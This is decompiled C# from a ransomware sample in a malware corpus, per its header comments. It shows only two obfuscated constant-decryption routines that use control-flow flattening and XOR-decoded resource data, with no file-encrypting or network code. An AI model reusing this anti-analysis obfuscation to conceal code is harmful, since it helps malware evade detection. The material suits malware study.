// Decompiled with JetBrains decompiler
// Type: ������H�z8�Y��
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79CC5886-3FF3-4BA2-A3E6-9E50089A921D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-5a26181f2f36991d9055db38b70c0df2d166b99d1714fb7a14978e2e0420b71d.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \uFFFD\uFFFD\u001A\uFFFD\uFFFD\uFFFD\uFFFDH\uFFFDz8\uFFFDY\uFFFD\uFFFD
{
  static object J\uFFFD\uFFFD\u003A\uFFFD\uFFFD\u0018\u001B06\u0029蓿\u0021\uFFFD(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = 2096639727U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    uint num2 = 1704905907;
    uint num3 = 855734;
    int num4 = 9 - (2 + 5 - (3 + 4));
    while (true)
    {
      uint num5;
      int num6;
      do
      {
        switch (num4)
        {
          case 1:
            num2 ^= (uint) (((int) ((num1 & 16711680U) >> 16) | ~((int) num1 & (int) byte.MaxValue)) * (~(int) num1 & 16711680));
            num4 = 2 - -4;
            continue;
          case 2:
          case 5:
          case 10:
            goto label_17;
          case 3:
            goto label_7;
          case 4:
            goto label_8;
          case 6:
            goto label_12;
          case 7:
          case 12:
            goto label_13;
          case 8:
            goto label_15;
          case 9:
            goto label_16;
          case 11:
            if (num5 < 0U || num5 >= 16U)
            {
              if (num5 < 16U || num5 >= 32U)
                goto case 17;
              else
                goto label_11;
            }
            else
              goto label_19;
          case 13:
            goto label_21;
          case 14:
            goto label_22;
          case 15:
            goto label_23;
          case 16:
            goto label_24;
          case 17:
            if (num5 < 32U || num5 >= 48U)
            {
              if (num5 >= 48U)
              {
                num6 = (int) num5;
                num4 = -~(~7 + -2 - -19);
                continue;
              }
              goto label_17;
            }
            else
              goto label_26;
          default:
            num5 = (num1 & (uint) byte.MaxValue) % 64U;
            num4 = -4 - -9 + 6;
            continue;
        }
      }
      while ((uint) num6 >= 64U);
      num4 = ~(-9 + (2 + 3) - 1) - 3;
      continue;
label_7:
      num1 += (uint) (((int) num2 | (int) num3) ^ 368693080);
      num4 = 8 + 5 + (5 + 3) - 16;
      continue;
label_11:
      num2 ^= (uint) (((int) num1 & 16711935) << 8 ^ ((int) ((num1 & 16776960U) >> 8) | ~(int) num1 & (int) ushort.MaxValue));
      num4 = -1 - ~(7 + 7);
      continue;
label_12:
      uint num7;
      num3 += (num1 ^ num7 - 1U) % num5;
      num4 = -~19 - 4;
      continue;
label_13:
      if (num7 > 64U)
      {
        num4 = -(~(5 - 4) - 8) - 6;
        continue;
      }
      num1 = (uint) (((int) num1 & 16777215) << 8) | (num1 & 4278190080U) >> 24;
      num4 = --~-1;
      continue;
label_15:
      num1 |= (uint) ((int) num2 + ~(int) num3 & 368693080);
      num4 = 8 + (-6 - ~7);
      continue;
label_16:
      num7 = 1U;
      num4 = ~~(-5 - 5 - -22);
      continue;
label_17:
      ++num7;
      num4 = ~4 - (7 - 19);
      continue;
label_19:
      num4 = 30 + (3 - 8 - (8 + 9)) - ~4;
      continue;
label_21:
      num2 |= (uint) ((int) ((num1 & 65280U) >> 8) & (int) ((num1 & 16711680U) >> 16) ^ ~(int) num1 & (int) byte.MaxValue);
      num3 ^= (uint) ((int) num1 * (int) num7 + 1) % 16U;
      num4 = ~(--3 - 7);
      continue;
label_22:
      num3 += num1 * num7 % 32U;
      num4 = ~~10 - 2;
      continue;
label_23:
      num2 += (uint) (((int) num1 & (int) byte.MaxValue | (int) ((num1 & 16711680U) >> 16)) + (~(int) num1 & (int) byte.MaxValue));
      num3 -= (uint) ~((int) num1 + (int) num5) % 48U;
      num1 ^= num2 % num3 | 368693080U;
      num4 = 6 - 8 - (~7 + 8 - 11) - 7;
      continue;
label_24:
      num1 -= (uint) (~((int) num2 ^ (int) num3) + 368693080);
      num4 = --~-11;
      continue;
label_26:
      num4 = ~(-22 - 2 + (4 + 4));
    }
label_8:
    uint num8 = num1 ^ b;
    object obj;
    if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num8, out obj))
    {
      byte[] bytes;
      byte num9;
      lock (\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
        int num10 = ~(-4 - (-7 + ~4) - (4 + 6));
        while (true)
        {
          switch (num10)
          {
            case 1:
              binaryReader.BaseStream.Seek((long) num8, SeekOrigin.Begin);
              num9 = binaryReader.ReadByte();
              num10 = ~(-5 - 4 + (3 + 5));
              continue;
            case 2:
              goto label_32;
            default:
              bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
              num10 = -~(7 - 6);
              continue;
          }
        }
      }
label_32:
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876227 ^ currentMethod.MetadataToken);
      int num11 = -(--2 - 4 + -7);
      while (true)
      {
        uint num12;
        ushort num13;
        ushort num14;
        ushort num15;
        ushort num16;
        int num17;
        do
        {
          int num18;
          do
          {
            switch (num11)
            {
              case 1:
                obj = (object) BitConverter.ToSingle(bytes, 0);
                num11 = -~12 - 8;
                continue;
              case 2:
                num13 = (ushort) (num12 >> 16);
                num11 = ~---7;
                continue;
              case 3:
                if (num9 == (byte) 152)
                {
                  obj = (object) BitConverter.ToDouble(bytes, 0);
                  goto label_44;
                }
                else
                {
                  num18 = (int) num9;
                  num11 = ~(-7 - 4 + (8 - 2));
                  continue;
                }
              case 4:
                switch (num9)
                {
                  case 11:
                    goto label_43;
                  case 50:
                    obj = (object) BitConverter.ToInt64(bytes, 0);
                    num11 = 5 - ~~0;
                    continue;
                  default:
                    goto label_47;
                }
              case 5:
                goto label_44;
              case 6:
                goto label_46;
              case 7:
                goto label_47;
              case 8:
                goto label_49;
              case 9:
                goto label_50;
              case 10:
                goto label_51;
              case 11:
                goto label_53;
              default:
                obj = (object) BitConverter.ToInt32(bytes, 0);
                goto label_44;
            }
          }
          while (num18 != 117);
          num11 = ~~(8 + 4 + 7 - 18);
          continue;
label_43:
          num11 = 9 - (9 - ~~2 - -2);
          continue;
label_44:
          \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num8] = obj;
          goto label_45;
label_46:
          num14 = (ushort) (num12 & (uint) ushort.MaxValue);
          num15 = num14;
          num16 = num13;
          num11 = 5 - ~7 - 3;
          continue;
label_47:
          num17 = (int) num9;
          num11 = -~~-5;
        }
        while (num17 != 27);
        num11 = ~(5 - -(5 - 8) - (2 + 9));
        continue;
label_49:
        obj = (object) Encoding.UTF8.GetString(bytes);
        num11 = ~2 - (4 - 7) + 5;
        continue;
label_50:
        num12 = (uint) (((int) num8 + (int) num9) * 1494844765);
        num11 = 8 - (5 + 5 - (8 + (7 - 7 - (7 - 3))));
        continue;
label_51:
        int index = 0;
        goto label_54;
label_53:
        ++index;
label_54:
        if (index < bytes.Length)
        {
          bytes[index] ^= (byte) ((num12 * (uint) num15 + (uint) num16) % 256U ^ (uint) numArray[index % 8]);
          num15 = (ushort) ((num12 * (uint) num15 + (uint) num13) % 65536U);
          num16 = (ushort) ((num12 * (uint) num16 + (uint) num14) % 65536U);
          num11 = 2 - (3 + 5 - (21 - ~~4));
        }
        else
          num11 = 8 - 6 - (--2 - 3);
      }
    }
label_45:
    return obj;
  }

  static object \uFFFD\uFFFD\u000Ay\u003B\uFFFD\uFFFDb\uFFFD\uFFFD\uFFFDe\u003FI\uFFFD(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = ~-13 + 7;
    uint num2;
    object obj;
    Stream 밬뻫曆轠閼೮;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      int num8;
      do
      {
        switch (num1)
        {
          case 1:
            if (num5 >= 0U && num5 < 16U)
            {
              num1 = ~(-11 - 3) - 7;
              continue;
            }
            if (num5 >= 16U && num5 < 32U)
            {
              num3 ^= (uint) (((int) num4 & 16711935) << 8 ^ ((int) ((num4 & 16776960U) >> 8) | ~(int) num4 & (int) ushort.MaxValue));
              num1 = ~(3 + ~(7 + 9) - ~7);
              continue;
            }
            goto case 23;
          case 2:
          case 16:
          case 20:
            goto label_29;
          case 3:
            num6 ^= (uint) ((int) num4 * (int) num7 + 1) % 16U;
            num1 = 2 + 2 - ~15 - 7;
            continue;
          case 4:
            num7 = 1U;
            num1 = ~~--22;
            continue;
          case 5:
            num6 += num4 * num7 % 32U;
            num1 = 23 - -~7 + 7 - 7;
            continue;
          case 6:
            num3 |= (uint) ((int) ((num4 & 65280U) >> 8) & (int) ((num4 & 16711680U) >> 16) ^ ~(int) num4 & (int) byte.MaxValue);
            num1 = 13 + (-6 - ~5) + ~9;
            continue;
          case 7:
            num6 -= (uint) ~((int) num4 + (int) num5) % 48U;
            num1 = -~(13 - 3);
            continue;
          case 8:
            num2 = num4 ^ b;
            num1 = -~--9;
            continue;
          case 9:
            int num9 = (int) num5;
            num1 = -~(7 + (2 + 2 + 8));
            if ((uint) num9 < 64U)
            {
              num1 = ~-16 + -8 - 7;
              continue;
            }
            continue;
          case 10:
            if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num2, out obj))
            {
              Monitor.Enter((object) (밬뻫曆轠閼೮ = \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮));
              goto label_35;
            }
            else
              goto label_44;
          case 11:
            num4 ^= num3 % num6 | 455699875U;
            num1 = 3 - (3 - 7 - --9);
            continue;
          case 12:
            num3 += (uint) (((int) num4 & (int) byte.MaxValue | (int) ((num4 & 16711680U) >> 16)) + (~(int) num4 & (int) byte.MaxValue));
            num1 = ~(7 - 23) - 8;
            continue;
          case 13:
            num4 += (uint) (((int) num3 | (int) num6) ^ 455699875);
            num1 = ~5 - -8;
            continue;
          case 14:
            if (num5 < 48U)
            {
              num1 = ~(~-6 - 26 - -8);
              continue;
            }
            break;
          case 15:
            num4 |= (uint) ((int) num3 + ~(int) num6 & 455699875);
            num1 = -(-2 + ~4 - 23) - 9;
            continue;
          case 17:
            goto label_25;
          case 18:
          case 22:
            goto label_26;
          case 19:
            goto label_28;
          case 21:
            goto label_30;
          case 23:
            if (num5 < 32U)
              break;
            goto label_33;
          case 24:
            goto label_34;
          default:
            num3 ^= (uint) (((int) ((num4 & 16711680U) >> 16) | ~((int) num4 & (int) byte.MaxValue)) * (~(int) num4 & 16711680));
            num1 = ~---25;
            continue;
        }
        num8 = (int) num5;
        num1 = ~~25 - 5;
      }
      while ((uint) num8 < 48U);
      num1 = ~-~-11;
      continue;
label_25:
      num6 = 1011018860U;
      num1 = 4 + -(4 + 7) + (6 + 5);
      continue;
label_26:
      if (num7 > 64U)
      {
        num1 = -4 - ~(4 + 7);
        continue;
      }
      num4 = (uint) (((int) num4 & 16777215) << 8) | (num4 & 4278190080U) >> 24;
      num5 = (num4 & (uint) byte.MaxValue) % 64U;
      num1 = --(9 + 3 - (5 - 8) - 14);
      continue;
label_28:
      num4 = 1976968587U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
      num3 = 1182400899U;
      num1 = 4 - (-8 - 5);
      continue;
label_29:
      ++num7;
      num1 = ~-~-20;
      continue;
label_30:
      num1 = --~-21;
      continue;
label_33:
      num1 = --(15 + (-9 - -8));
      continue;
label_34:
      num6 += (num4 ^ num7 - 1U) % num5;
      num4 -= (uint) (~((int) num3 ^ (int) num6) + 455699875);
      num1 = 2 - -(19 - (2 - 7 + (8 - 2)));
    }
label_35:
    byte num10;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
      binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
      num10 = binaryReader.ReadByte();
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
      switch (-6 - 8 - -7 + 7)
      {
      }
    }
    finally
    {
      Monitor.Exit((object) 밬뻫曆轠閼೮);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876226 ^ currentMethod.MetadataToken);
    uint num11 = (uint) (((int) num2 + (int) num10) * 1494844765);
    int num12 = -(6 - (26 - (3 + 2 + 9)));
    while (true)
    {
      int index;
      ushort num13;
      ushort num14;
      ushort num15;
      ushort num16;
      int num17;
      int length;
      do
      {
        switch (num12)
        {
          case 1:
            ++index;
            num12 = ~~~-4;
            continue;
          case 2:
          case 4:
          case 5:
          case 7:
            \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num2] = obj;
            goto label_44;
          case 3:
            num17 = index;
            length = bytes.Length;
            num12 = -~(2 - ~-4);
            continue;
          case 6:
            goto label_49;
          case 8:
            goto label_52;
          case 9:
            if (num10 != (byte) 152)
            {
              if (num10 != (byte) 117)
                goto case 11;
              else
                goto label_51;
            }
            else
              goto label_54;
          case 10:
            goto label_55;
          case 11:
            if (num10 != (byte) 11)
            {
              if (num10 != (byte) 50)
              {
                if (num10 == (byte) 27)
                {
                  obj = (object) Encoding.UTF8.GetString(bytes);
                  goto case 2;
                }
                else
                  goto case 2;
              }
              else
                goto label_48;
            }
            else
              goto label_57;
          default:
            bytes[index] ^= (byte) ((num11 * (uint) num13 + (uint) num14) % 256U ^ (uint) numArray[index % 8]);
            num13 = (ushort) ((num11 * (uint) num13 + (uint) num15) % 65536U);
            num14 = (ushort) ((num11 * (uint) num14 + (uint) num16) % 65536U);
            num12 = --(0 + ~-2);
            continue;
        }
      }
      while (num17 < length);
      num12 = ~-6 - -8 - 4;
      continue;
label_48:
      obj = (object) BitConverter.ToInt64(bytes, 0);
      num12 = ~-(1 + ~(4 - 7));
      continue;
label_49:
      num15 = (ushort) (num11 >> 16);
      num16 = (ushort) (num11 & (uint) ushort.MaxValue);
      num12 = ~---11;
      continue;
label_51:
      obj = (object) BitConverter.ToSingle(bytes, 0);
      num12 = --(-(4 - 9) - 1);
      continue;
label_52:
      obj = (object) BitConverter.ToInt32(bytes, 0);
      num12 = --0 + 5;
      continue;
label_54:
      obj = (object) BitConverter.ToDouble(bytes, 0);
      num12 = ~~~-8;
      continue;
label_55:
      num13 = num16;
      num14 = num15;
      index = 0;
      num12 = 7 - (~-12 - (9 - 2));
      continue;
label_57:
      num12 = ~-(~~9 - 0);
    }
label_44:
    return obj;
  }
}
